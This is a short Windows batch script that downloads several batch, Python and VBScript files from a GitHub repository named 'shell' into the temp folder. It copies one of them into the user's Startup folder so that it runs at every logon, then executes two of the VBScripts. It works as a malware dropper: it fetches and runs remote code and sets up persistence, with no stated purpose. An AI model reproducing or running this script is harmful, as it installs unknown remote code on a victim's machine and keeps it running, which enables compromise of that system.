@echo off
set "downloads_dir=%USERPROFILE%\Downloads"
curl https://raw.githubusercontent.com/0x2034/shell/main/pro.bat -o %temp%\pro.bat
curl https://raw.githubusercontent.com/0x2034/shell/main/sh.py -o %temp%\sh.py
curl https://raw.githubusercontent.com/0x2034/shell/main/vb.vbs -o %temp%\vb.vbs
curl https://raw.githubusercontent.com/0x2034/shell/main/vb1.vbs -o "%temp%\vb1.vbs"
curl https://raw.githubusercontent.com/0x2034/shell/main/post.bat -o "%temp%\post.bat"
curl https://raw.githubusercontent.com/0x2034/shell/main/post.vbs -o "%temp%\post.vbs"
copy "%temp%\post.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
start /wait %temp%\vb.vbs
call "%temp%\vb1.vbs"
exit
